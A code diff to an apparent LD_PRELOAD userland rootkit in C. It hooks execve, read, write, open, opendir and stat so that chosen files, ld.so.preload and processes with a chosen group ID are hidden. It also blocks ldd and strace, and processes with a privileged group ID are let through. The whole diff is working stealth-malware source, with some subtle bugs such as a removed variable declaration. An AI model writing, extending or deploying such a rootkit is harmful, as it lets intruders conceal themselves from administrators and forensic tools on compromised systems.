@@ -45,8 +45,6 @@ int good_gid() {
     return 0;
 }
 
-// EXECVE
-
 int pid_to_gid(int pid) {
     char path[1024];
     sprintf(path, "/proc/%d/status", pid);
@@ -59,7 +57,6 @@ int pid_to_gid(int pid) {
     char line[256];
     while (fgets(line, sizeof(line), fp)) {
         if (strncmp(line, "Gid:", 4) == 0) {
-            int gid;
             if (sscanf(line, "Gid: %d", &gid) == 1) {
                 break;
             }
@@ -71,6 +68,8 @@ int pid_to_gid(int pid) {
 
     return gid;
 }
+
+// EXECVE
 
 int (*o_execve)(const char *, char *const argv[], char *const envp[]);
 int execve(const char *path, char *const argv[], char *const envp[]) {
@@ -85,6 +84,13 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
     }
 
     if (strcmp(path, HIDDEN_EXEC_PATH) == 0) {
+        return -1;
+    }
+
+    // if executing ldd return -1
+    if (argv[0] != NULL && strcmp(argv[0], "ldd") == 0
+    || argv[0] != NULL && strcmp(argv[0], "strace") == 0
+    ) {
         return -1;
     }
 
@@ -210,9 +216,21 @@ ssize_t write(int fd, const void *xbuf, size_t count) {
 
     if (fd == 1) {
         char *buf = (char *) xbuf;
-        if (strstr(buf, HIDDEN_FILENAME) != NULL || strstr(buf, HIDDEN_FILENAME2) != NULL) {
+        if (
+            strstr(buf, HIDDEN_FILENAME) != NULL 
+        || strstr(buf, HIDDEN_FILENAME2) != NULL
+        || strstr(buf, HIDDEN_EXEC_PATH) != NULL
+        || strstr(buf, HIDDEN_PATH) != NULL
+        ) {
             return count;
         }
+    }
+
+    if (fd == 3) {
+        // save it to a log file
+        // TODO
+        printf("write to log file\n");
+        printf("%s\n", (char *) xbuf	);
     }
 
     return o_write(fd, xbuf, count);
@@ -230,6 +248,17 @@ ssize_t read(int fd, void *xbuf, size_t count) {
 
     if (good_gid() == 1) {
         return o_read(fd, xbuf, count);
+    }
+
+    // dont allow reading of hidden files
+    char *buf = (char *) xbuf;
+    if (
+        strstr(buf, HIDDEN_FILENAME) != NULL
+    || strstr(buf, HIDDEN_FILENAME2) != NULL
+    || strstr(buf, HIDDEN_EXEC_PATH) != NULL
+    || strstr(buf, HIDDEN_PATH) != NULL
+    ) {
+        return 0;
     }
 
     return o_read(fd, xbuf, count);
@@ -275,6 +304,16 @@ int openat(int dirfd, const char *path, int flags, ...) {
         return -1;
     }
 
+    if (strstr(path, "/proc/") != NULL) {
+        // if the file is in /proc/ check if the gid is the same as the one we want to hide
+        int pid = atoi(path + 6);
+        int gid = pid_to_gid(pid);
+
+        if (gid == GID) {
+            return -1;
+        }
+    }
+
     return o_openat(dirfd, path, flags);
 }
 
@@ -294,6 +333,15 @@ int open64(const char *path, int flags, ...) {
 
     if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
         return -1;
+    }
+
+    if (strstr(path, "/proc/") != NULL) {
+        int pid = atoi(path + 6);
+        int gid = pid_to_gid(pid);
+
+        if (gid == GID) {
+            return -1;
+        }
     }
 
     return o_openat64(AT_FDCWD, path, flags);
@@ -334,6 +382,24 @@ DIR *opendir(const char *name) {
         return o_opendir(name);
     }
 
+    if (strcmp(name, "ld.so.preload") == 0 || strcmp(name, HIDDEN_FILENAME) == 0 || strcmp(name, HIDDEN_FILENAME2) == 0) {
+        return NULL;
+    }
+
+    // get name of current directory using getcwd
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+
+    // check if the directory is in /proc/
+    if (strstr(cwd, "/proc/") != NULL) {
+        int pid = atoi(cwd + 6);
+        int gid = pid_to_gid(pid);
+
+        if (gid == GID) {
+            return NULL;
+        }
+    }
+
     return o_opendir(name);
 }
 
@@ -355,22 +421,14 @@ int stat(const char *pathname, struct stat *statbuf) {
         return -1;
     }
 
-    return o_stat(pathname, statbuf);
-}
+    if (strstr(pathname, "/proc/") != NULL) {
+        int pid = atoi(pathname + 6);
+        int gid = pid_to_gid(pid);
 
-// ioctl
-
-int (*o_ioctl)(int, unsigned long, ...);
-int ioctl(int fd, unsigned long request, ...) {
-#ifdef VERBOSE
-    printf("ioctl called\n");
-#endif
-    if(!o_ioctl)
-        o_ioctl = dlsym(RTLD_NEXT, "ioctl");
-
-    if (good_gid() == 1) {
-        return o_ioctl(fd, request);
+        if (gid == GID) {
+            return -1;
+        }
     }
 
-    return o_ioctl(fd, request);
+    return o_stat(pathname, statbuf);
 }
